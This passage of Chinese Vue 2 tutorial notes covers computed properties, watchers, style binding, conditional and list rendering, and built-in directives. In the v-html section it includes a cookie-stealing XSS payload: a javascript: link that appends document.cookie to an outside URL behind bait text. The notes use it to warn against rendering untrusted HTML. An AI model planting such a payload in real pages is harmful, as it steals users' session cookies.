    Vue.config.keyCodes.huiche = 13;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        // 函数
        methods: {
            showInfo() {
                // 回车键的 event.keyCode 是 13，所以这个意思是按了回车才会打印 
                if( event.keyCode === 13 ){
                    console.log(event.target.value);
                }
            },
            showInfo2() {
                console.log(event.target.value);
            }
        }
    });

</script>

</html>
```

## 8、计算属性 `computed`

### ①、插值语法实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        姓：<input type="text" v-model="firstName"></br>
        名：<input type="text" v-model="lastName"></br>
        姓名：{{firstName}}-{{lastName}}

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        data: {
            firstName: '月',
            lastName: '海'
        },
    });

</script>

</html>
```

### ②、`methods` 函数实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        姓：<input type="text" v-model="firstName"></br>
        名：<input type="text" v-model="lastName"></br>
        姓名：<span>{{fullName()}}</span>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        data: {
            firstName: '月',
            lastName: '海'
        },
        // 函数
        methods: {
            fullName(){
                return `${this.firstName}-${this.lastName}`
            }
        }
    });

</script>

</html>
```

### ③、计算属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        姓：<input type="text" v-model="firstName"></br>
        名：<input type="text" v-model="lastName"></br>
        姓名：<span>{{fullName}}</span>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        data: {
            firstName: '月',
            lastName: '海'
        },
        // 计算属性配置
        computed: {
            // 计算属性需要为对象
            fullName: {
                // 当有人读取 fullName 的值时，就会调用此 get 方法，get 的返回值就是 fullName 的值
                get(){
                    console.log('fullName 被读取');
                    return `${this.firstName}-${this.lastName}`;
                },
                // 当有人修改 fullName 的值时，就会调用此 set 方法
                set(value){
                    console.log('fullName 被修改');
                    // 处理传入的数据
                    let arr = value.split('-');
                    // 给属性赋值
                    this.firstName = arr[0];
                    this.lastName = arr[1];
                }
            }
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-774--QPpVvMvn1dRbBA.png)

### ④、计算属性简写

确定了该计算属性只用作读取，不会对其修改，才可以使用简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        姓：<input type="text" v-model="firstName"></br>
        名：<input type="text" v-model="lastName"></br>
        姓名：<span>{{fullName}}</span>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    // 创建 vue 实例，并将实例赋值给 v
    const v = new Vue({
        // el 用于指定当前 vue 实例为哪个容器服务，值通常为 css 选择器字符串
        el: '#root',
        data: {
            firstName: '月',
            lastName: '海'
        },
        // 计算属性配置
        computed: {
            // 计算属性简写；只能读取值，不能修改
            fullName(){
                // 当有人读取 fullName 的值时，就会调用此 get 方法，get 的返回值就是 fullName 的值
                console.log('fullName 被读取');
                return `${this.firstName}-${this.lastName}`;
            }
        }
    });

</script>

</html>
```

## 9、监视（侦听）属性 `watch`

1. 当被监视的属性变化时，回调函数自动调用， 进行相关操作
2. 监视的属性必须存在，才能进行监视
3. 监视的两种写法：
   1. `new Vue` 时传入 `watch` 配置
   2. 通过 `vm.$watch` 监视

### ①、天气案例（准备工作）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定方法 -->
        <button @click="changeWeather">切换天气1</button>
        <!-- 直接写表达式(不推荐) -->
        <button @click="isHot = !isHot">切换天气2</button>

        <!-- 使用 window 的内置对象,报错 -->
        <button @click="alert('切换天气3')">切换天气3</button>
        <!-- 解决方法：在 data 中定义 window,然后调用时使用 window 调用(不建议) -->
        <button @click="window.alert('切换天气4')">切换天气4</button>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    new Vue({
        el: '#root',
        // 数据
        data: {
            isHot: true,
            window
        },
        // 计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '寒冷';
            }
        },
        // 函数
        methods: {
            changeWeather(){
                this.isHot = !this.isHot;
            }
        }
    });

</script>

</html>
```

### ②、监视属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

        <!-- 
            监视属性watch：
                1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
                2.监视的属性必须存在，才能进行监视！！
                3.监视的两种写法：
                        (1).new Vue时传入watch配置
                        (2).通过vm.$watch监视
		-->
    
    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定方法 -->
        <button @click="changeWeather">切换天气</button>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            isHot: true,
            window
        },
        // 计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '寒冷';
            }
        },
        // 函数
        methods: {
            changeWeather(){
                this.isHot = !this.isHot;
            }
        },
        // 监视属性
        watch: {
            // 监视的属性名
            isHot: {
                // immediate：是否立即执行（网页被加载后），默认为 false
                immediate: true,

                // 当监视的属性发生改变时，调用其中的函数
                // 参数1：修改后的值
                // 参数2：修改前的值
                handler(newVal, oldVal){
                    console.log(`isHot 被从【${oldVal}】修改为了【${newVal}】`);
                }
            }
        },
    });

    // 可以另外配置监视属性，而不是创建 vue 对象时配置
    // 参数1：要监视的属性
    // 参数2：配置项
    vm.$watch('info', {
        handler(newVal, oldVal){
            console.log(`info 被从【${oldVal}】修改为了【${newVal}】`);
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-56-925--1ga0Lox9lpq7Og.png)

### ③、深度监视

1. Vue 中的 `watch` 默认不监测对象内部值的改变（一层）。
2. 配置 `deep:true` 可以监测对象内部值改变（多层）。
3. Vue 自身可以监测对象内部值的改变，但 Vue 提供的 watch 默认不可以！
4. 使用 watch 时根据数据的具体结构，决定是否采用深度监视。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        <h3>a 的值是：{{number.a}}</h3>
        <button @click="number.a++">a + 1</button>

        <h3>b 的值是：{{number.b}}</h3>
        <button @click="number.b++">b + 1</button>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            number: {
                a: 1,
                b: 2
            }
        },
        // 监视属性
        watch: {
            // 监视多级属性中某个属性的变化
            'number.a': {
                // 当监视的属性发生改变时，调用其中的函数
                // 参数1：修改后的值
                // 参数2：修改前的值
                handler(newVal, oldVal){
                    console.log(`number.a 被从【${oldVal}】修改为了【${newVal}】`);
                }
            },
            'number.b': {
                handler(newVal, oldVal){
                    console.log(`number.b 被从【${oldVal}】修改为了【${newVal}】`);
                }
            },
            // 监视多级属性中所有属性的变化
            'number': {
                // depp：深度监视，可以检测多级属性中某个值是否发生了变化，默认为 false
                deep: true,
                handler(newVal, oldVal){
                    console.log(`number 被从【${oldVal}】修改为了【${newVal}】`);
                }
            }
        },
    });

</script>

</html>
```

### ④、监视的简写形式

- 不需要 `immediate` 配置，也不需要 `deep` 配置，才可以简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        
        <h3>今天天气很{{info}}</h3>
        <!-- 绑定方法 -->
        <button @click="changeWeather">切换天气</button>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            isHot: true
        },
        // 计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '寒冷';
            }
        },
        // 函数
        methods: {
            changeWeather(){
                this.isHot = !this.isHot;
            }
        },
        // 监视属性
        watch: {
            // 监视的简写形式：不需要 immediate 配置，也不需要 deep 配置，才可以简写
            isHot(newVal, oldVal){
                console.log(`isHot 被从【${oldVal}】修改为了【${newVal}】`);
            }
        },
    });

    // 另外配置的监视属性的简写置
    // 参数1：要监视的属性
    // 参数2：配置项
    vm.$watch('info', function(newVal, oldVal){
        console.log(`info 被从【${oldVal}】修改为了【${newVal}】`);
    });

</script>

</html>
```

### ⑤、`computed` 和 `watch`

- `computed` 和 `watch` 之间的区别：
1. `computed` 能完成的功能，`watch` 都可以完成
2. `watch` 能完成的功能，`computed` 不一定能完成，例如：`watch` 可以进行异步操作
- 两个重要的小原则：
1. 所有被 Vue 管理的函数，最好写成普通函数，这样 `this` 的指向才是 vm 或 组件实例对象。
2. 所有不被 Vue 所管理的函数（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），最好写成箭头函数，这样 `this` 的指向才是 vm 或 组件实例对象。

## 10、绑定样式

在应用界面中, 某个(些)元素的样式是变化的
class/style 绑定就是专门用来实现动态样式效果的技术

### ①、class 的绑定

1. 字符串写法；适用于：样式的 class 名不确定，需要动态指定
2. 数组写法；适用于：样式的 class 名不确定、且个数也不确定
3. 对象写法；适用于：样式的 class 名确定、且个数确定，但要动态确定要不要使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
    <!-- css -->
    <style>
        .basic{
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        
        .happy{
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal{
            background-color: skyblue;
        }

        .atguigu1{
            background-color: yellowgreen;
        }
        .atguigu2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .atguigu3{
            border-radius: 20px;
        }
    </style>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- 绑定 class 样式：字符串写法；适用于：样式的 class 名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div>

        <!-- 绑定 class 样式：数组写法；适用于：样式的 class 名不确定、且个数也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div>

        <!-- 绑定 class 样式：对象写法；适用于：样式的 class 名确定、且个数确定，但要动态确定要不要使用 -->
        <div class="basic" :class="classAObj">{{name}}</div>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '月海',
            mood: 'normal',
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classAObj: {
                // true 为启用，false 为不启用
                atguigu1: true,
                atguigu2: false,
                atguigu3: false
            }
        },
        methods: {
            changeMood(){
                // 随机改变样式
                let arr = ['happy', 'sad', 'normal'];
                // 取 0、1、2 的随机数
                let index = Math.floor(Math.random()*3);

                this.mood = arr[index];
            }
        },
    });

</script>

</html>
```

### ②、style 的绑定

- 尽量不要使用内联式的 css 样式

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- 绑定 style 样式：数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>

        <!-- 绑定 style 样式：对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '月海',

            styleArr: [{
                fontSize: '40px',
                color: 'red'
            },{
                backgroundColor: 'bule'
            }],
            
            styleObj: {
                fontSize: '40px',
                color: 'red'
            }
        }
    });

</script>

</html>
```

## 11、条件渲染（`v-if`）

1. `v-show`：隐藏，本质是添加了 class 属性 `display: none`，DOM 元素不会被移除；需要传入布尔值，适用于变动频率高的场景
2. `v-if`、`v-else-if`、`v-else`：判断语句，条件不成立则不会渲染此元素，DOM 元素会被移除；需要传入布尔值，适用于变动频率低的场景
3. template：页面渲染时，会舍弃 template 标签，只保留此标签中的元素；不能和 `v-show` 配合使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- 隐藏，本质是添加了 class 属性 display: none；需要传入布尔值 -->
        <p v-show="false">{{name}}</p>

        <!-- 判断语句，条件不成立则不会渲染此元素；需要传入布尔值 -->
        <p v-if="num === 1">{{num}}</p>
        <p v-else-if="num === 2">{{num}}</p>
        <p v-else-if="num === 3">{{num}}</p>
        <p v-else>{{num}}</p>

        <!-- template：页面渲染时，会舍弃 template  标签，只保留此标签中的元素；不能和 v-show 配合使用 -->
        <template v-if="num === 2">
            <p>言</p>
        </template>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '月海',
            num: 2
        }
    });

</script>

</html>
```

## 12、列表渲染（`v-for`）

### ①、`v-for`

- `for-of` 循环

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">
        <!-- for-of 循环；key：每次循环的唯一标识符 -->
        <ul v-for="per of persons" :key="per.id">
            <li>{{per.id}}-{{per.name}}-{{per.age}}</li>
        </ul>

        <hr/>

        <!-- 可以接收多个参数；参数1：本次遍历的元素；参数2：本次遍历的索引值 -->
        <ul v-for="( per, index ) of persons" :key="per.id">
            <li>{{per.id}}-{{per.name}}-{{per.age}}-index：{{index}}</li>
        </ul>

        <hr/>

        <!-- 遍历对象；参数1：属性值；参数2：属性名 -->
        <ul v-for="( value, key ) of persons[0]" :key="key">
            <li>{{key}}:{{value}}</li>
        </ul>

        <hr/>

        <!-- 遍历字符串；参数1：本次遍历的字符；参数2：本次遍历的字符的索引值 -->
        <ul v-for="( value, index ) of name">
            <li>{{value}}-{{index}}</li>
        </ul>

        <hr/>

        <!-- 遍历指定次数；参数1：本次遍历的次数；参数2：本次遍历的索引值 -->
        <ul v-for="( num, index ) of 10" :key="num">
            <li>{{num}}-{{index}}</li>
        </ul>
    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '月海',
            persons: [
                {id: 01, name: '月海', age: 16},
                {id: 02, name: '言', age: 14},
                {id: 03, name: '羽', age: 16},
            ]
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-104--oT4BvSN1FKH50A.png)

### ②、key 的作用与原理

1. 虚拟 DOM 中 key 的作用：key 是虚拟 DOM 对象的标识，当数据发生变化时，Vue 会根据新数据生成新的虚拟 DOM，随后 Vue 进行新虚拟 DOM 与旧虚拟 DOM 的差异比较，比较规则如下：
2. 对比规则：
   1. 旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key：
      1. 若虚拟 DOM 中内容没变，直接使用之前的真实 DOM
      2. 若虚拟 DOM 中内容变了, 则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM。
   2. 旧虚拟 DOM 中未找到与新虚拟 DOM 相同的 key：创建新的真实 DOM，随后渲染到到页面。
3. 用 index 作为 key 可能会引发的问题：
   1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实 DOM 更新 ==> 界面效果没问题, 但效率低。
   2. 如果结构中还包含输入类的 DOM：会产生错误 DOM 更新 ==> 界面有问题。
4. 开发中如何选择 key
   1. 最好使用每条数据的唯一标识作为 key，比如 id、手机号、身份证号、学号等唯一值。
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用 index 作为 key 是没有问题的。

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-243--5cZZGzmunVontw.png)

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-446--j6J_6NiKdVKBkQ.png)

### ③、列表过滤-使用监视属性

- 根据输入框内输入的值，对数据进行筛选

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">

        <input type="text" placeholder="请输入姓名：" v-model="keyWord">
        <!-- for-of 循环；key：每次循环的唯一标识符 -->
        <ul v-for="(per, index) of personsFilter" :key="per.id">
            <li>{{per.id}}-{{per.name}}-{{per.age}}</li>
        </ul>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            keyWord: '',
            persons: [
                {id: 01, name: '月海', age: 16},
                {id: 02, name: '言', age: 14},
                {id: 03, name: '羽', age: 16},
            ],
            personsFilter: []
        },
        watch: {
            keyWord: {
                // 开启立即执行（网页被加载后），即网页加载后就为数组 personsFilter 赋值
                immediate: true,
                handler(newVal, oldVal){
                    // filter：创建一个新数组，新数组中的元素是通过检查指定数组中符合条件的所有元素
                    // 将过滤后创建的新数组，赋值给数组 
                    this.personsFilter = this.persons.filter((p) =>{
                        // 返回值为 true ，则通过检查，添加到新数组
                        return p.name.indexOf(newVal) !== -1;
                    })
                }
            }
        }
    });

</script>

</html>
```

### ④、列表过滤-使用计算属性

- 根据输入框内输入的值，对数据进行筛选（建议使用此方式）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">

        <input type="text" placeholder="请输入姓名：" v-model="keyWord">
        <!-- for-of 循环；key：每次循环的唯一标识符 -->
        <ul v-for="(per, index) of personsFilter" :key="per.id">
            <li>{{per.id}}-{{per.name}}-{{per.age}}</li>
        </ul>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            keyWord: '',
            persons: [
                {id: 01, name: '月海', age: 16},
                {id: 02, name: '言', age: 14},
                {id: 03, name: '羽', age: 16},
            ]
        },
        computed: {
            personsFilter(){
                return this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })
            }
        }
    });

</script>

</html>
```

### ⑤、列表排序

- 根据年龄排序

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>
<body>

    <!-- 准备一个 vue 容器 -->
    <div id="root">

        <input type="text" placeholder="请输入姓名：" v-model="keyWord">
        <button @click="sortType = 1">升序</button>
        <button @click="sortType = 2">降序</button>
        <button @click="sortType = 0">原顺序</button>
        <!-- for-of 循环；key：每次循环的唯一标识符 -->
        <ul v-for="(per, index) of personsFilter" :key="per.id">
            <li>{{per.id}}-{{per.name}}-{{per.age}}</li>
        </ul>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            keyWord: '',
            persons: [
                {id: 01, name: '月海', age: 16},
                {id: 02, name: '言', age: 14},
                {id: 03, name: '羽', age: 16},
            ],
            // 因为计算属性是属性不是函数，不可以传递参数；所以这里定义一个变量，来代表点击的哪个按钮
            // 1升序 2降序 0原顺序
            sortType: 0
        },
        computed: {
            personsFilter(){
                let arr = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })

                // 判断排序类型
                if( this.sortType === 1 ){
                    // sort 函数会改变原数组；
                    // 当返回值为负数时，那么前面的数在前面，也就是不动；当返回值为正数时，那么后面的数在前
                    // 即，p1 - p2：升序（小的在前面）；p2 - p1：降序（大的在前面）
                    arr.sort((p1, p2) =>{
                        return p1.age - p2.age;
                    })
                }else if( this.sortType === 2 ){
                    arr.sort((p1, p2) => {
                        return p2.age - p1.age;
                    })
                }

                return arr;
            }
        }
    });

</script>

</html>
```

## 13、常用内置指令

1. `v-bind` 单向绑定，可以省略 `v-bind`
2. `v-model` 双向数据绑定
3. `v-on` 绑定事件监听, 一般简写为 `@`
4. `v-if` 如果为 true, 当前标签才会输出到页面
5. `v-for` 遍历数组/对象
6. `v-show` 通过控制 `display` 样式来控制显示/隐藏
7. `v-text `更新元素的 `textContent`
   1. 作用：向其所在的节点中渲染文本内容（标签也会当作字符串输出，插值语法也是输出字符串）
   2. 与插值语法的区别：`v-text` 会替换掉节点中的内容，`{{xx}}` 则不会替换
8. `v-html` 更新元素的 `innerHTML`
   1. 作用：向指定节点中渲染包含 `html` 结构的内容。
   2. 与插值语法的区别：
      1. `v-html` 会替换掉节点中所有的内容，`{{xx}}` 则不会。
      2. `v-html` 可以识别 `html` 结构。
   3. 严重注意：`v-html` 有安全性问题！！！！
      1. 在网站上动态渲染任意 `HTML` 是非常危险的，容易导致 `XSS` 攻击。
      2. 一定要在可信的内容上使用 `v-html`，永不要用在用户提交的内容上！
9. `v-cloak` 防止闪现, 与 css 配合: `[v-cloak] { display:none}`
   1. 本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 `v-cloak` 属性。
   2. 使用 css 配合 `v-cloak` 可以解决网速慢时页面展示出 `{{xxx}}` 的问题。
10. `v-once` 指定静态内容
   1. `v-once` 所在节点在初次动态渲染后，就视为静态内容了。
   2. 以后数据的改变不会引起 `v-once` 所在结构的更新，可以用于优化性能。
11. `v-pre` 跳过其所在节点的编译过程
   1. 跳过其所在节点的编译过程。
   2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 vue -->
    <script src="../js/vue.js"></script>
</head>

<body>
        
    <div id="root">

        <span>{{name}}言</span><hr/>

        <!-- 
            v-text 指令：
                1.作用：向其所在的节点中渲染文本内容。
                2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
		-->
        <p v-text="name">{{name}}言</p><hr/>

        <!-- 
            v-html 指令：
                1.作用：向指定节点中渲染包含html结构的内容。
                2.与插值语法的区别：
                    (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                    (2).v-html可以识别html结构。
                3.严重注意：v-html有安全性问题！！！！
                    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                    (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
        <p v-html="name">{{name}}言</p>
        <!-- 传递参数到其他网站 -->
        <p v-html="str"></p><hr/>

        <!-- 
            v-cloak 指令（没有值）：
                1.本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性。
                2.使用 css 配合 v-cloak 可以解决网速慢时页面展示出 {{xxx}} 的问题。
		-->
        <p v-cloak>{{name}}言</p><hr/>

        <!-- 
			v-once指令：
                1.v-once所在节点在初次动态渲染后，就视为静态内容了。
                2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
		-->
        <p v-once>{{name}}言</p><hr/>

        <!-- 
			v-pre指令：
                1.跳过其所在节点的编译过程。
                2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
		-->
        <p v-pre>{{name}}言</p>

    </div>

</body>

<script>
    // 阻止 vue 在启动时生成开发版提示
    Vue.config.productionTip = false;

    const vm = new Vue({
        el: '#root',
        // 数据
        data: {
            name: '<h2>月海</h2>',
            str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
        }
    });

</script>

</html>
```

![image.png](https://www.yue-hai.top:10300/file/downloadFile?fullFilePath=%2Fhome%2Fyan%2F%E6%A1%8C%E9%9D%A2%2F%E5%86%85%E5%AD%98%2F%E6%96%87%E6%A1%A3%E8%B5%84%E6%96%99%2FTakeDown%2FWeb%2FJS%20%E6%A1%86%E6%9E%B6%2Fattachments%2F2023-07-25-12--50-57-673--fm-SDyg4b9tBVw.png)

## 14、自定义指令

1. 定义语法：
   1. 局部指令：

```vue
new Vue({new Vue({
      directives:{指令名:配置对象},
      // 或		
  		directives:{指令名:回调函数}
  })
})
```

   2. 全局指令：

```vue
